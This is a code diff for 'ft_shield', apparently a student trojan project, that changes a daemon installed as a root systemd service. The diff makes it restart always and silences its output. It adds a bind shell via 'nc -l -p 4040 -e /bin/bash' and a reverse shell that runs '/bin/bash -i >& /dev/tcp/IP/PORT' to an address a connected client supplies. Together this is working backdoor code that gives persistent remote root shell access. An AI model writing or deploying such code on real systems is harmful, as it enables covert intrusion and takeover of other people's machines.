@@ -5,7 +5,7 @@
                             	"\n"\
                             	"[Service]\n"\
                             	"User=root\n"\
-                            	"Restart=on-failure\n"\
+                            	"Restart=always\n"\
                             	"RestartSec=5s\n"\
                             	"ExecStart=/usr/bin/ft_shield\n"\
                             	"WorkingDirectory=/\n"\
@@ -125,7 +125,7 @@ bool	is_bin(void)
 
 void	create_daemon(void)
 {
-	// int		fd;
+	int		fd;
 	pid_t	pid = fork();
 
 	if (pid < 0)
@@ -137,17 +137,17 @@ void	create_daemon(void)
 	if (chdir("/") < 0)
 		ft_error("chdir");
 	umask(0);
-	// fd = open("/dev/null", O_RDWR);
-	// if (fd < 0)
-	// 	ft_error("open");
-	// if (dup2(fd, STDIN_FILENO) < 0)
-	// 	ft_error("dup stdin");
-	// if (dup2(fd, STDOUT_FILENO) < 0)
-	// 	ft_error("dup stdout");
-	// if (dup2(fd, STDERR_FILENO) < 0)
-	// 	ft_error("dup stderr");
-	// if (close(fd) < 0)
-	// 	ft_error("close fd");
+	fd = open("/dev/null", O_RDWR);
+	if (fd < 0)
+		ft_error("open");
+	if (dup2(fd, STDIN_FILENO) < 0)
+		ft_error("dup stdin");
+	if (dup2(fd, STDOUT_FILENO) < 0)
+		ft_error("dup stdout");
+	if (dup2(fd, STDERR_FILENO) < 0)
+		ft_error("dup stderr");
+	if (close(fd) < 0)
+		ft_error("close fd");
 	return ;
 }
 
@@ -298,12 +298,18 @@ void	create_remote_shell_session(int fd)
 	}
 	if (!pid)
 	{
-		close(g_server->server_sock);
-		if (dup2(fd, STDIN_FILENO) < 0 || dup2(fd, STDOUT_FILENO) < 0 || dup2(fd, STDERR_FILENO) < 0)
-			ft_error("dup in reverse shell");
-		execl("/bin/bash", "/bin/bash", "-i", NULL);
-		send_msg_to_client("Failed to create remote shell connection.\n", fd);
-		ft_error("execl");
+		// close(g_server->server_sock);
+		// if (0 > dup2(fd, 0) || 0 > dup2(fd, 1) || 0 > dup2(fd, 2)) {
+		// 	send_msg_to_client("Error creating reverse shell\n", fd);
+		// 	exit(1);
+		// }
+		char *argv[] = {"nc", "-l", "-p", "4040", "-e", "/bin/bash", NULL};
+		execv("/usr/bin/nc", argv);
+		send_msg_to_client("Failed to execute remote shell\n", fd);
+		ft_error("execv");
+		// exit(1);
+		// execl("/bin/bash", "/bin/bash", "-i", NULL);
+		// send_msg_to_client("Failed to create remote shell connection.\n", fd);
 	}
 	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
 	{
@@ -313,12 +319,55 @@ void	create_remote_shell_session(int fd)
 		g_server->clients_info[i].shell_pid = pid;
 		break;
 	}
-
 }
 
-void	create_reverse_shell_connection(fd, user_input)
+void	create_reverse_shell_connection(int fd, char *user_input)
 {
+	char	ipv4_address[16] = {0};
+	char	port[6] = {0};
+	char	cmd[10] = {0};
+	struct	sockaddr_in	sa = {0};
 
+	if (sscanf(user_input, "%s %15s %5s", cmd, ipv4_address, port) != 3)
+	{
+		send_msg_to_client("Error: Invalid Arguments\n", fd);
+		send_msg_to_client("Usage: reverse <IPV4 ADDRESS> <PORT>\n", fd);
+		return;
+	}
+	if (inet_pton(AF_INET, ipv4_address, &(sa.sin_addr)) != 1)
+	{
+		send_msg_to_client("Error: Invalid IPV4 address\n", fd);
+		return;
+	}
+	if (atoi(port) < 1024 || atoi(port) > 65535)
+	{
+		send_msg_to_client("Error: Invalid PORT\n", fd);
+		return;
+	}
+	pid_t	pid = fork();
+	if (pid < 0)
+	{
+		send_msg_to_client("Failed to create reverese shell connection\n", fd);
+		return;
+	}
+	if (!pid)
+	{
+		close(g_server->server_sock);
+		char	bash_cmd[128];
+		snprintf(bash_cmd, sizeof(bash_cmd), "/bin/bash -i >& /dev/tcp/%s/%s 0>&1", ipv4_address, port);
+		char	*argv[] = {"/bin/bash", "-c", bash_cmd, NULL};
+		execv("/bin/bash", argv);
+		send_msg_to_client("Failed to create reverese shell connection\n", fd);
+		ft_error("execv");
+	}
+	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
+	{
+		if (g_server->clients[i].fd != fd)
+			continue;
+		g_server->clients_info[i].in_shell = true;
+		g_server->clients_info[i].shell_pid = pid;
+		break;
+	}
 }
 
 void	handle_client_commands(int fd, char *cmd)
@@ -333,12 +382,12 @@ void	handle_client_commands(int fd, char *cmd)
 		create_remote_shell_session(fd);
 	else if (!strcmp(user_input, "reverse"))
 		create_reverse_shell_connection(fd, user_input);
-	else if (!strcmp(user_input, "send"))
-		send_file_to_client(fd, user_input);
-	else if (!strcmp(user_input, "receive"))
-		recv_file_from_client(fd, user_input);
 	else
 		send_msg_to_client(COMMAND_NOT_FOUND, fd);
+	// else if (!strcmp(user_input, "send"))
+	// 	send_file_to_client(fd, user_input);
+	// else if (!strcmp(user_input, "receive"))
+	// 	recv_file_from_client(fd, user_input);
 	return;
 }
 
@@ -376,10 +425,9 @@ void	recv_msg_from_client(int idx)
 		return;
 	}
 	if (!g_server->clients_info[idx].in_shell)
-	{
 		handle_client_commands(client_fd, buff);
+	if (!g_server->clients_info[idx].in_shell)
 		send_msg_to_client("ft_shield $> ", client_fd);
-	}
 	return;
 }
 
